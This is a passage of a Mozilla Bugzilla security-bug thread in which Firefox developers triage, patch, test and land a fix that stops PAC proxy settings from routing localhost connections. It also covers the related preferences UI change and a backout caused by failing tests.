| [Updated](/show_bug.cgi?id=1503393#a159747_537703)• 6 years ago |

Keywords: [sec-high](/buglist.cgi?keywords=sec-high&resolution=---)

|  | [Alex Gaynor [:Alex\_Gaynor]](/user_profile?user_id=537703) |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1503393#c10)• 6 years ago |
|  | |

Ooop, brain fart.Keywords: [sec-high](/buglist.cgi?keywords=sec-high&resolution=---) → [sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---)

|  | [Daniel Stenberg [:bagder]](/user_profile?user_id=16743) |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1503393#c11)• 6 years ago |
|  | |

Is there ever any reason for users to actually (willingly) proxy away "localhost" that we would risk breaking with this patch?Priority: -- → P1Whiteboard: [necko-triaged]

|  | [Selena Deckelmann :selenamarie :selena](/user_profile?user_id=452035) |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1503393#c12)• 6 years ago |
|  | |

:mt can you comment?

|  | [Daniel Stenberg [:bagder]](/user_profile?user_id=16743) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1503393#a739554_16743)• 6 years ago |

Flags: needinfo?(martin.thomson)

|  | [Martin Thomson [:mt:]](/user_profile?user_id=438654) |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1503393#c13)• 6 years ago |
|  | |

I think that we show let localhost be localhost and assume a fixed mapping from localhost to 127.0.0.1 or ::1. We don't need to treat localhost6 or \*.localdomain specially. localhost is the only name that <https://datatracker.ietf.org/doc/html/draft-ietf-dnsop-let-localhost-be-localhost> blesses in this way.
It is possible that proxying connections to localhost do have use cases that depend on this. For instance, there might be an application, like Fiddler, that is used for diagnostic purposes that is inserted in this way. However, I think that we shouldn't entertain that possibility. We provide plenty of other ways of achieving that end, so my only suggestion there is to watch carefully when rolling this change out.Flags: needinfo?(martin.thomson)

|  | [Daniel Stenberg [:bagder]](/user_profile?user_id=16743) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1503393#a748095_16743)• 6 years ago |

[Attachment #9021830](/attachment.cgi?id=9021830&action=edit "0001-bug-1503393-don-t-proxy-localhost-whatever-proxy-tha.patch") -
Flags: review?(honzab.moz)

|  | [Honza Bambas (:mayhemer)](/user_profile?user_id=269762) |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=1503393#c14)• 6 years ago |
|  | |

Comment on [attachment 9021830](/attachment.cgi?id=9021830 "0001-bug-1503393-don-t-proxy-localhost-whatever-proxy-tha.patch") [[details]](/attachment.cgi?id=9021830&action=edit "0001-bug-1503393-don-t-proxy-localhost-whatever-proxy-tha.patch") [[diff]](/attachment.cgi?id=9021830&action=diff "0001-bug-1503393-don-t-proxy-localhost-whatever-proxy-tha.patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1503393&attachment=9021830)
0001-bug-1503393-don-t-proxy-localhost-whatever-proxy-tha.patch
Review of [attachment 9021830](/attachment.cgi?id=9021830 "0001-bug-1503393-don-t-proxy-localhost-whatever-proxy-tha.patch") [[details]](/attachment.cgi?id=9021830&action=edit "0001-bug-1503393-don-t-proxy-localhost-whatever-proxy-tha.patch") [[diff]](/attachment.cgi?id=9021830&action=diff "0001-bug-1503393-don-t-proxy-localhost-whatever-proxy-tha.patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1503393&attachment=9021830):
-----------------------------------------------------------------
Looks like the order your patch is now fixing has been broken (or set deliberately) at:
<https://searchfox.org/mozilla-central/diff/ad3855ddf60ea11f60d4fa075baec47da681714d/netwerk/base/src/nsProtocolProxyService.cpp#1265>
[bug 66057](/show_bug.cgi?id=66057 "RESOLVED FIXED - Proxy: $http_proxy should influence proxy settings"), and also somewhat related osx [bug 125995](/show_bug.cgi?id=125995 "VERIFIED FIXED - Proxy: Take settings from Network Preferences [Mac OS X]"). I haven't found a clear explanation of why the CanUseProxy check is mode only for non-system/auto-detect proxy setting.
this also needs some changes to the prefs UI, I'm afraid (don't forget about TB,SM as well, unless prefs live in a shared toolkit code). the field for listing exceptions is disabled when one of autodetect/system is set, I think. that has to change to avoid confusion and bad UX, as those now apply for all proxy settings cases.
r+ only for the necko change, but we definitely need a UI patch as well, IMO.
::: netwerk/base/nsProtocolProxyService.cpp
@@ +2230,5 @@
> + if ((mProxyConfig == PROXYCONFIG\_DIRECT) ||
> + !CanUseProxy(uri, info.defaultPort))
> + return NS\_OK;
> +
> + bool mainThreadOnly;
nit: indent
[Attachment #9021830](/attachment.cgi?id=9021830&action=edit "0001-bug-1503393-don-t-proxy-localhost-whatever-proxy-tha.patch") -
Flags: review?(honzab.moz) → review+

|  | [Daniel Stenberg [:bagder]](/user_profile?user_id=16743) |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=1503393#c15)• 6 years ago |
|  | |

As this is still marked a security issue, how would we proceed and get the associated UI logic fixed? (I looked, it's not likely something that I'd do myself.)
I think either we land the networking part first, and then file a follow-up issue to make sure the UI shows the exclude field for all proxy types or we invite a suitable UI-skilled person to submit a separate patch here so that they can land in tandem.
I would need advice on how to handle TB and SM prefs UI (if there's any)! The browser UI code looks specific for Firefox.
This issue is marked sec-moderate, which we according to the guidelines can land "without any explicit approval" so it's more about what's right from a bug-handling view.
What do you say Honza? I personally prefer the first: we land this, then do the follow-up changes separately.Flags: needinfo?(honzab.moz)

|  | [Daniel Stenberg [:bagder]](/user_profile?user_id=16743) |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=1503393#c16)• 6 years ago |
|  | |

Attached patch

[the network code patch for this issue](attachment.cgi?id=9023897&action=diff) (obsolete)
— [Details](attachment.cgi?id=9023897&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1503393&attachment=9023897)

Updated to fix the indent nit, carrying on the r+.
[Attachment #9021830](/attachment.cgi?id=9021830&action=edit "0001-bug-1503393-don-t-proxy-localhost-whatever-proxy-tha.patch") -
Attachment is obsolete: true
[Attachment #9023897](/attachment.cgi?id=9023897&action=edit "the network code patch for this issue") -
Flags: review+

|  | [Honza Bambas (:mayhemer)](/user_profile?user_id=269762) |  |
| --- | --- | --- |
| [Comment 17](/show_bug.cgi?id=1503393#c17)• 6 years ago |
|  | |

As discussed, we have to file a new security(?) UI/UX bug (I'd wait for Selena to figure out what we need here.) Not sure if this one should wait or not, really.
In my opinion, this should not be tracked as a security bug at all. Opening will somewhat untie our hands in landing/having dependencies.
dveditz, what do you think?Flags: needinfo?(honzab.moz) → needinfo?(dveditz)

|  | [Martin Thomson [:mt:]](/user_profile?user_id=438654) |  |
| --- | --- | --- |
| [Comment 18](/show_bug.cgi?id=1503393#c18)• 6 years ago |
|  | |

Comment on [attachment 9023897](/attachment.cgi?id=9023897 "the network code patch for this issue") [[details]](/attachment.cgi?id=9023897&action=edit "the network code patch for this issue") [[diff]](/attachment.cgi?id=9023897&action=diff "the network code patch for this issue") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1503393&attachment=9023897)
the network code patch for this issue
Review of [attachment 9023897](/attachment.cgi?id=9023897 "the network code patch for this issue") [[details]](/attachment.cgi?id=9023897&action=edit "the network code patch for this issue") [[diff]](/attachment.cgi?id=9023897&action=diff "the network code patch for this issue") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1503393&attachment=9023897):
-----------------------------------------------------------------
Where are the tests for this change?

|  | [Daniel Stenberg [:bagder]](/user_profile?user_id=16743) |  |
| --- | --- | --- |
| [Comment 19](/show_bug.cgi?id=1503393#c19)• 6 years ago |
|  | |

Attached patch

[verify default localhost skipped from PAC proxying](attachment.cgi?id=9023960&action=diff) (obsolete)
— [Details](attachment.cgi?id=9023960&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1503393&attachment=9023960)

Here's a small addition to the protocolproxy tests that verifies that by default we don't proxy "localhost" in a PAC setup. (Requires the previous patch to pass.)
[Attachment #9023960](/attachment.cgi?id=9023960&action=edit "verify default localhost skipped from PAC proxying") -
Flags: review?(honzab.moz)

|  | [Honza Bambas (:mayhemer)](/user_profile?user_id=269762) |  |
| --- | --- | --- |
| [Comment 20](/show_bug.cgi?id=1503393#c20)• 6 years ago |
|  | |

Comment on [attachment 9023960](/attachment.cgi?id=9023960 "verify default localhost skipped from PAC proxying") [[details]](/attachment.cgi?id=9023960&action=edit "verify default localhost skipped from PAC proxying") [[diff]](/attachment.cgi?id=9023960&action=diff "verify default localhost skipped from PAC proxying") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1503393&attachment=9023960)
verify default localhost skipped from PAC proxying
Review of [attachment 9023960](/attachment.cgi?id=9023960 "verify default localhost skipped from PAC proxying") [[details]](/attachment.cgi?id=9023960&action=edit "verify default localhost skipped from PAC proxying") [[diff]](/attachment.cgi?id=9023960&action=diff "verify default localhost skipped from PAC proxying") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1503393&attachment=9023960):
-----------------------------------------------------------------
thanks!
[Attachment #9023960](/attachment.cgi?id=9023960&action=edit "verify default localhost skipped from PAC proxying") -
Flags: review?(honzab.moz) → review+

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 21](/show_bug.cgi?id=1503393#c21)• 6 years ago |
|  | |

(In reply to Honza Bambas (:mayhemer) from [comment #17](/show_bug.cgi?id=1503393#c17 "RESOLVED FIXED - firefox permits proxying localhost via PAC"))
> In my opinion, this should not be tracked as a security bug at all. Opening
> will somewhat untie our hands in landing/having dependencies.
> dveditz, what do you think?
This was reported to us thanks to investigation by the chrome team while working on their own version of this problem, <https://bugs.chromium.org/p/chromium/issues/detail?id=899126>. They're still treating theirs as a hidden security bug and we should honor that.
We can land this fix without unhiding the bug. We could also file an unhidden UX "feature request" to expose the exceptions field for all proxy types. Just don't say that not being able to edit the exceptions means there were no exceptions.Flags: needinfo?(dveditz)See Also: → <https://bugs.chromium.org/p/chromium/issues/detail?id=899126>Whiteboard: [necko-triaged] → [necko-triaged][keep hidden while crbug/899126 is]

|  | [Justin Dolske [:Dolske]](/user_profile?user_id=27780) |  |
| --- | --- | --- |
| [Comment 22](/show_bug.cgi?id=1503393#c22)• 6 years ago |
|  | |

(In reply to Daniel Stenberg [:bagder] from [comment #15](/show_bug.cgi?id=1503393#c15 "RESOLVED FIXED - firefox permits proxying localhost via PAC"))
> As this is still marked a security issue, how would we proceed and get the
> associated UI logic fixed? (I looked, it's not likely something that I'd do
> myself.)
Selena poked me about this bug. Gijs, can you help out with the UI changes? Sounds like we just need to have the UI always enable the "No Proxy for" field as being used for any form of proxy connection?
Also NIing mkaply as just a heads up, since this bug generally sounds like the kind of thing that enterprise users might be using.
Driveby comment: Are we sure we just want to rely on this field for localhost (as opposed to, say, a suitably scary sounding pref)? I'd sorta expect users and deployments to not really understand the impact of clearing localhost from those fields and allowing it to be proxied.
Driveby 2: The defaults for network.proxy.no\_proxies\_on are "localhost, 127.0.0.1". What happens with IPv6
Driveby 3 (help I have a problem): Are there cases where someone would \_want\_ the current behavior to prevent localhost sniffing? But I suppose that's really different class of problem?Flags: needinfo?(mozilla)Flags: needinfo?(gijskruitbosch+bugs)

|  | [Mike Kaply [:mkaply]](/user_profile?user_id=7313) |  |
| --- | --- | --- |
| [Comment 23](/show_bug.cgi?id=1503393#c23)• 6 years ago |
|  | |

I always believed that network.proxy.no\_proxies\_on was honored for all types even if it was disabled in those cases, and I think that other folks probably did too.
So I don't see a problem with moving this out to be the general case. If someone has a particular issue, they can just remove localhost from the no proxies case if necessary.Flags: needinfo?(mozilla)

|  | [:Gijs (he/him)](/user_profile?user_id=159069)  Assignee |  |
| --- | --- | --- |
| [Comment 24](/show_bug.cgi?id=1503393#c24)• 6 years ago |
|  | |

(In reply to Justin Dolske [:Dolske] from [comment #22](/show_bug.cgi?id=1503393#c22 "RESOLVED FIXED - firefox permits proxying localhost via PAC"))
> Gijs, can you help out with the UI changes?
> Sounds like we just need to have the UI always enable the "No Proxy for"
> field as being used for any form of proxy connection?
> <snip>
> Driveby comment: Are we sure we just want to rely on this field for
> localhost (as opposed to, say, a suitably scary sounding pref)? I'd sorta
> expect users and deployments to not really understand the impact of clearing
> localhost from those fields and allowing it to be proxied.
I concur with this. While we could handle this in the UI only (ie make the UI enforce that localhost / 127.0.0.1 / ::1 are in the pref, when edited through said UI), that wouldn't prevent problems for users who either themselves or through a well-meaning/oblivious sysadmin manually configure the prefs (whether via our blessed enterprise deployment mechanisms or otherwise).
It's particularly pernicious because the vulnerability would be a result of omission, rather than explicitly opting in to unsafe behavior.
In practice, I believe that means we should add a block immediately after the mShutdown check in <https://searchfox.org/mozilla-central/rev/007b66c1f5f7a1b9a900a2038652a16a020f010c/netwerk/base/nsProtocolProxyService.cpp#1929> that force-adds the relevant entries. Then we can change the existing filter list pref's default to empty string.
:bagder, how does that sound? Was there maybe some discussion outside of this bug that led to the current patch?
I'm happy to provide a UI patch to always enable the edit field for the existing filter pref, but I think we should sort this question out, too. We could potentially show text above the filter textbox saying something like "localhost is never proxied", to clarify that it doesn't need to be in there.
If we want an opt-out, to avoid the vulnerable-by-omission issue, I think it should be more explicitly named, e.g. (strawman, please do suggest better alternatives) network.proxy.allow\_hijacking\_localhost (default false, of course). I would propose not having UI for this (beyond the obvious about:config).Flags: needinfo?(gijskruitbosch+bugs) → needinfo?(daniel)

|  | [Daniel Stenberg [:bagder]](/user_profile?user_id=16743) |  |
| --- | --- | --- |
| [Comment 25](/show_bug.cgi?id=1503393#c25)• 6 years ago |
|  | |

> force-adds the relevant entries
I would be slightly concerned about the changed behavior for those 12 users (my guesstimate!) in the wild who actually have this pref changed and still actually and truly want to proxy localhost.
But I would also be fine if we instead would offer a different opt-out for localhost explicitly.
I think it boils down to making the UI sensible to users so that they don't shoot themselves too easily. If we deem the current style with a text field that contains the localhost versions is too easily used wrongly, then changing the localhost to an explicit opt-out is good.
(It is after all also possible that some of those 12 users changed it by mistake and now proxy localhost without it ever being intended...)Flags: needinfo?(daniel)

|  | [:Gijs (he/him)](/user_profile?user_id=159069)  Assignee |  |
| --- | --- | --- |
| [Comment 26](/show_bug.cgi?id=1503393#c26)• 6 years ago |
|  | |

Per discussion with :bagder on IRC, I'll put up a small patch here ASAP to just always enable the edit field that we can land in this bug, and file a (sec-sensitive) follow-up for moving the localhost stuff into a separate pref.

|  | [:Gijs (he/him)](/user_profile?user_id=159069)  Assignee |  |
| --- | --- | --- |
| [Comment 27](/show_bug.cgi?id=1503393#c27)• 6 years ago |
|  | |

Attached patch

[Make 'no proxy' field editable](attachment.cgi?id=9024992&action=diff) (obsolete)
— [Details](attachment.cgi?id=9024992&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1503393&attachment=9024992)

This will mean the field is disabled only when the user selects "no proxy".
[Attachment #9024992](/attachment.cgi?id=9024992&action=edit "Make 'no proxy' field editable") -
Flags: review?(jaws)

|  | [:Gijs (he/him)](/user_profile?user_id=159069)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1503393#a1263723_159069)• 6 years ago |

Depends on: [1507110](/show_bug.cgi?id=1507110 "RESOLVED FIXED - Always no-proxy localhost/127.0.0.1 except if user very explicitly opts out")

|  | [Jared Wein [:jaws] (please needinfo? me)](/user_profile?user_id=409754) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1503393#a1416903_409754)• 6 years ago |

[Attachment #9024992](/attachment.cgi?id=9024992&action=edit "Make 'no proxy' field editable") -
Flags: review?(jaws) → review+

|  | [:Gijs (he/him)](/user_profile?user_id=159069)  Assignee |  |
| --- | --- | --- |
| [Comment 28](/show_bug.cgi?id=1503393#c28)• 6 years ago |
|  | |

I think this is ready to land - :dveditz, given the status of crbug/899126, can this just land on inbound today (as it's sec-moderate, doesn't need approval) or do you want to sync up with the chrome team or something?Flags: needinfo?(dveditz)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 29](/show_bug.cgi?id=1503393#c29)• 6 years ago |
|  | |

This can land any time. The chrome bug is still hidden but they've landed their patch:
[https://chromium.googlesource.com/chromium/src.git/+/0e2a57db78b2dca463903ab26523fe9ac1798949](https://chromium.googlesource.com/chromium/src.git/%2B/0e2a57db78b2dca463903ab26523fe9ac1798949)Flags: needinfo?(dveditz)

|  | [:Gijs (he/him)](/user_profile?user_id=159069)  Assignee |  |
| --- | --- | --- |
| [Comment 30](/show_bug.cgi?id=1503393#c30)• 6 years ago |
|  | |

(In reply to Daniel Veditz [:dveditz] from [comment #29](/show_bug.cgi?id=1503393#c29 "RESOLVED FIXED - firefox permits proxying localhost via PAC"))
> This can land any time. The chrome bug is still hidden but they've landed
> their patch:
> [https://chromium.googlesource.com/chromium/src.git/+/](https://chromium.googlesource.com/chromium/src.git/%2B/)
> 0e2a57db78b2dca463903ab26523fe9ac1798949
OK, great. :bagder, can you land this? I'm also happy to do it, just wanting to make sure someone does and didn't want to do it without checking with you. :-)Flags: needinfo?(daniel)

|  | [Daniel Stenberg [:bagder]](/user_profile?user_id=16743) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1503393#a1691120_16743)• 6 years ago |

Flags: needinfo?(daniel)Keywords: [checkin-needed](/buglist.cgi?keywords=checkin-needed&resolution=---)

|  | [Sebastian Hengst [:aryx] (needinfo me if it's about an intermittent or backout)](/user_profile?user_id=258347) |  |
| --- | --- | --- |
| [Comment 31](/show_bug.cgi?id=1503393#c31)• 6 years ago |
|  | |

<https://hg.mozilla.org/integration/autoland/rev/606cfe2ddd368dc617f52795ddb2f5016d3ef1a8>
<https://hg.mozilla.org/integration/autoland/rev/7b1514667292828ecbabc998ad42947da468c0e9>
<https://hg.mozilla.org/integration/autoland/rev/02892fb6feaba4654eb127812b8a43147cc6690b>Keywords: [checkin-needed](/buglist.cgi?keywords=checkin-needed&resolution=---)

|  | [Sebastian Hengst [:aryx] (needinfo me if it's about an intermittent or backout)](/user_profile?user_id=258347) |  |
| --- | --- | --- |
| [Comment 32](/show_bug.cgi?id=1503393#c32)• 6 years ago |
|  | |

Backed out for failing xpcshell's test\_proxy-failover\_canceled.js and mochitest browser-chrome's browser\_firstPartyIsolation.js:
<https://hg.mozilla.org/integration/autoland/rev/d277cd7dcbb4c4c5e2741723fd6974bb79367055>
Push with failures: <https://treeherder.mozilla.org/#/jobs?repo=autoland&resultStatus=testfailed%2Cbusted%2Cexception%2Cretry%2Cusercancel%2Crunnable&group_state=expanded&revision=02892fb6feaba4654eb127812b8a43147cc6690b>
Failure log xpcshell: <https://treeherder.mozilla.org/logviewer.html#?job_id=212698531&repo=autoland>
[task 2018-11-19T20:37:19.112Z] 20:37:19 INFO - TEST-START | netwerk/test/unit/test\_proxy-failover\_canceled.js
[task 2018-11-19T20:37:19.608Z] 20:37:19 WARNING - TEST-UNEXPECTED-FAIL | netwerk/test/unit/test\_proxy-failover\_canceled.js | xpcshell return code: 0
[task 2018-11-19T20:37:19.611Z] 20:37:19 INFO - TEST-INFO took 494ms
[task 2018-11-19T20:37:19.611Z] 20:37:19 INFO - >>>>>>>
[task 2018-11-19T20:37:19.611Z] 20:37:19 INFO - PID 8359 | [8359, Main Thread] WARNING: Couldn't get the user appdata directory. Crash events may not be produced.: file /builds/worker/workspace/build/src/toolkit/crashreporter/nsExceptionHandler.cpp, line 2749
[task 2018-11-19T20:37:19.611Z] 20:37:19 INFO - PID 8359 | Couldn't convert chrome URL: chrome://branding/locale/brand.properties
[task 2018-11-19T20:37:19.613Z] 20:37:19 INFO - (xpcshell/head.js) | test MAIN run\_test pending (1)
[task 2018-11-19T20:37:19.614Z] 20:37:19 INFO - PID 8359 | [8359, Main Thread] WARNING: NS\_ENSURE\_SUCCESS(rv, rv) failed with result 0x80004002: file /builds/worker/workspace/build/src/toolkit/components/resistfingerprinting/nsRFPService.cpp, line 683
[task 2018-11-19T20:37:19.616Z] 20:37:19 INFO - PID 8359 | [8359, Main Thread] WARNING: NSS will be initialized without a profile directory. Some things may not work as expected.: file /builds/worker/workspace/build/src/security/manager/ssl/nsNSSComponent.cpp, line 1562
[task 2018-11-19T20:37:19.617Z] 20:37:19 INFO - PID 8359 | [8359, Main Thread] WARNING: site security information will not be persisted: file /builds/worker/workspace/build/src/security/manager/ssl/nsSiteSecurityService.cpp, line 553
[task 2018-11-19T20:37:19.618Z] 20:37:19 INFO - PID 8359 | [8359, Main Thread] WARNING: NS\_ENSURE\_SUCCESS(rv, NS\_ERROR\_UNEXPECTED) failed with result 0x80004005: file /builds/worker/workspace/build/src/extensions/cookie/nsPermissionManager.cpp, line 1038
[task 2018-11-19T20:37:19.619Z] 20:37:19 INFO - PID 8359 | [8359, Cache2 I/O] WARNING: Forcing memory-only entry since CacheFileIOManager doesn't have mCacheDirectory.: file /builds/worker/workspace/build/src/netwerk/cache2/CacheFile.cpp, line 538
[task 2018-11-19T20:37:19.620Z] 20:37:19 INFO - (xpcshell/head.js) | test pending (2)
[task 2018-11-19T20:37:19.621Z] 20:37:19 INFO - (xpcshell/head.js) | test MAIN run\_test finished (2)
[task 2018-11-19T20:37:19.621Z] 20:37:19 INFO - running event loop
[task 2018-11-19T20:37:19.622Z] 20:37:19 INFO - PID 8359 | [8359, Main Thread] WARNING: Could not get the program name for a cubeb stream.: 'NS\_SUCCEEDED(rv)', file /builds/worker/workspace/build/src/dom/media/CubebUtils.cpp, line 358
[task 2018-11-19T20:37:19.623Z] 20:37:19 INFO - "CONSOLE\_MESSAGE: (info) No chrome package registered for chrome://branding/locale/brand.properties"
[task 2018-11-19T20:37:19.624Z] 20:37:19 INFO - Got data despite expecting a failure
[task 2018-11-19T20:37:19.625Z] 20:37:19 INFO - /builds/worker/workspace/build/tests/xpcshell/tests/netwerk/test/unit/head\_channels.js:onDataAvailable:143
[task 2018-11-19T20:37:19.626Z] 20:37:19 INFO - /builds/worker/workspace/build/tests/xpcshell/head.js:\_do\_main:226
[task 2018-11-19T20:37:19.626Z] 20:37:19 INFO - /builds/worker/workspace/build/tests/xpcshell/head.js:\_execute\_test:546
[task 2018-11-19T20:37:19.627Z] 20:37:19 INFO - -e:null:1
[task 2018-11-19T20:37:19.628Z] 20:37:19 INFO - exiting test
[task 2018-11-19T20:37:19.629Z] 20:37:19 INFO - Error in onDataAvailable: [Exception... "Abort" nsresult: "0x80004004 (NS\_ERROR\_ABORT)" location: "JS frame :: /builds/worker/workspace/build/tests/xpcshell/head.js :: \_abort\_failed\_test :: line 759" data: no]
[task 2018-11-19T20:37:19.629Z] 20:37:19 INFO - /builds/worker/workspace/build/tests/xpcshell/tests/netwerk/test/unit/head\_channels.js:onDataAvailable:158
[task 2018-11-19T20:37:19.630Z] 20:37:19 INFO - /builds/worker/workspace/build/tests/xpcshell/head.js:\_do\_main:226
[task 2018-11-19T20:37:19.631Z] 20:37:19 INFO - /builds/worker/workspace/build/tests/xpcshell/head.js:\_execute\_test:546
[task 2018-11-19T20:37:19.631Z] 20:37:19 INFO - -e:null:1
[task 2018-11-19T20:37:19.632Z] 20:37:19 INFO - exiting test
[task 2018-11-19T20:37:19.632Z] 20:37:19 INFO - PID 8359 | JavaScript error: /builds/worker/workspace/build/tests/xpcshell/head.js, line 759: NS\_ERROR\_ABORT:
[task 2018-11-19T20:37:19.633Z] 20:37:19 INFO - TEST-PASS | netwerk/test/unit/test\_proxy-failover\_canceled.js | finish\_test - [finish\_test : 23] "" == ""
[task 2018-11-19T20:37:19.634Z] 20:37:19 INFO - "CONSOLE\_MESSAGE: (error) [JavaScript Error: "NS\_ERROR\_ABORT: " {file: "/builds/worker/workspace/build/tests/xpcshell/head.js" line: 759}]"
[task 2018-11-19T20:37:19.634Z] 20:37:19 INFO - (xpcshell/head.js) | test finished (1)
[task 2018-11-19T20:37:19.635Z] 20:37:19 INFO - exiting test
Failure log browser-chrome: <https://treeherder.mozilla.org/logviewer.html#?job_id=212696805&repo=autoland>
[task 2018-11-19T20:37:42.473Z] 20:37:42 INFO - Entering test bound ip\_address\_test
[task 2018-11-19T20:37:42.474Z] 20:37:42 INFO - Buffered messages finished
[task 2018-11-19T20:37:42.474Z] 20:37:42 INFO - TEST-UNEXPECTED-FAIL | browser/components/originattributes/test/browser/browser\_firstPartyIsolation.js | Test timed out -Flags: needinfo?(daniel)

|  | [Daniel Stenberg [:bagder]](/user_profile?user_id=16743) |  |
| --- | --- | --- |
| [Comment 33](/show_bug.cgi?id=1503393#c33)• 6 years ago |
|  | |

I've starred at the browser\_firstPartyIsolation.js test without understand why changing proxying over localhost changes that. Can anyone else clue me in if there's anything obvious I'm missing?
I've fixed the test\_proxy-failover\_canceled.js test already locally.Flags: needinfo?(daniel)

|  | [Martin Thomson [:mt:]](/user_profile?user_id=438654) |  |
| --- | --- | --- |
| [Comment 34](/show_bug.cgi?id=1503393#c34)• 6 years ago |
|  | |

I don't know the code here, so maybe I'm completely wrong, but the last test uses an IP address, but we rely on a proxy for mochitests, don't we?
<https://searchfox.org/mozilla-central/rev/0859e6b10fb901875c80de8f8fc33cbb77b2505e/browser/components/originattributes/test/browser/browser_firstPartyIsolation.js#287-288>
The changes would prevent that unless you tweak the pref to specifically allow proxying. Try tweaking network.proxy.no\_proxies\_on to see if that fixes it.

|  | [:Gijs (he/him)](/user_profile?user_id=159069)  Assignee |  |
| --- | --- | --- |
| [Comment 35](/show_bug.cgi?id=1503393#c35)• 6 years ago |
|  | |

(In reply to Martin Thomson [:mt:] from [comment #34](/show_bug.cgi?id=1503393#c34 "RESOLVED FIXED - firefox permits proxying localhost via PAC"))
> I don't know the code here, so maybe I'm completely wrong, but the last test
> uses an IP address, but we rely on a proxy for mochitests, don't we?
>
> <https://searchfox.org/mozilla-central/rev/>
> 0859e6b10fb901875c80de8f8fc33cbb77b2505e/browser/components/originattributes/
> test/browser/browser\_firstPartyIsolation.js#287-288
>
> The changes would prevent that unless you tweak the pref to specifically
> allow proxying. Try tweaking network.proxy.no\_proxies\_on to see if that
> fixes it.
The screenshot ( <https://taskcluster-artifacts.net/URrEOxguThmj_PZ6wsN_Mw/0/public/test_info//mozilla-test-fail-screenshot_zvOf90.png> ) from the test failure ( <https://treeherder.mozilla.org/#/jobs?repo=autoland&resultStatus=testfailed%2Cbusted%2Cexception%2Cretry%2Cusercancel%2Crunnable&group_state=expanded&revision=02892fb6feaba4654eb127812b8a43147cc6690b&selectedJob=212696805> ) suggests this is right. It shows the new tab opened for the ip address test has loaded an error page. Now that we'll no longer use the proxy, the test tries to open <http://127.0.0.1/> (so at port 80), and uses:
await BrowserTestUtils.browserLoaded(tab.linkedBrowser, true);
which will wait for the browser to load a page. For various reasons that aren't really relevant here, error page loads "don't count", so the test will sit there forever waiting for a load in that browser. Presumably, when 127.0.0.1 is proxied, the proxy takes care of loading something there.
Sticking:
await SpecialPowers.pushPrefEnv({set: [["network.proxy.no\_proxies\_on", ""]]});
at the start of that subtest (ie first line in function ip\_address\_test) should work.

|  | [Daniel Stenberg [:bagder]](/user_profile?user_id=16743) |  |
| --- | --- | --- |
| [Comment 36](/show_bug.cgi?id=1503393#c36)• 6 years ago |
|  | |

I'm running the patches on try now (<https://treeherder.mozilla.org/#/jobs?repo=try&revision=a5aa6edc18ec0b0c2f1fc7e2aaf61852f24f4bfa>) and the fixed test commit looks like this: <https://hg.mozilla.org/try/rev/157999d696022a78660e537720e2d6f6aa33288c>

|  | [Daniel Stenberg [:bagder]](/user_profile?user_id=16743) |  |
| --- | --- | --- |
| [Comment 37](/show_bug.cgi?id=1503393#c37)• 6 years ago |
|  | |

Attached patch

[0001-bug-1503393-adjust-tests-for-localhost-proxying-r-ma.patch](attachment.cgi?id=9028261&action=diff) (obsolete)
— [Details](attachment.cgi?id=9028261&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1503393&attachment=9028261)

Here's the follow-up patch mentioned above that fixes two test failures due to the changed localhost proxy handling.
[Attachment #9028261](/attachment.cgi?id=9028261&action=edit "0001-bug-1503393-adjust-tests-for-localhost-proxying-r-ma.patch") -
Flags: review?(honzab.moz)

|  | [Honza Bambas (:mayhemer)](/user_profile?user_id=269762) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1503393#a2659709_269762)• 6 years ago |

[Attachment #9028261](/attachment.cgi?id=9028261&action=edit "0001-bug-1503393-adjust-tests-for-localhost-proxying-r-ma.patch") -
Flags: review?(honzab.moz) → review+

|  | [Daniel Stenberg [:bagder]](/user_profile?user_id=16743) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1503393#a2664417_16743)• 6 years ago |

Keywords: [checkin-needed](/buglist.cgi?keywords=checkin-needed&resolution=---)

|  | [Sebastian Hengst [:aryx] (needinfo me if it's about an intermittent or backout)](/user_profile?user_id=258347) |  |
| --- | --- | --- |
| [Comment 38](/show_bug.cgi?id=1503393#c38)• 6 years ago |
|  | |

Please rebase the patches, they got bitrotted by the code style change on Friday.Flags: needinfo?(daniel)Keywords: [checkin-needed](/buglist.cgi?keywords=checkin-needed&resolution=---)

|  | [Daniel Stenberg [:bagder]](/user_profile?user_id=16743) |  |
| --- | --- | --- |
| [Comment 39](/show_bug.cgi?id=1503393#c39)• 6 years ago |
|  | |

Attached patch

[v2-0001-bug-1503393-never-let-localhost-get-sent-to-a-pro.patch](attachment.cgi?id=9029278&action=diff)
— [Details](attachment.cgi?id=9029278&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1503393&attachment=9029278)

[Attachment #9023897](/attachment.cgi?id=9023897&action=edit "the network code patch for this issue") -
Attachment is obsolete: trueFlags: needinfo?(daniel)
[Attachment #9029278](/attachment.cgi?id=9029278&action=edit "v2-0001-bug-1503393-never-let-localhost-get-sent-to-a-pro.patch") -
Flags: review+

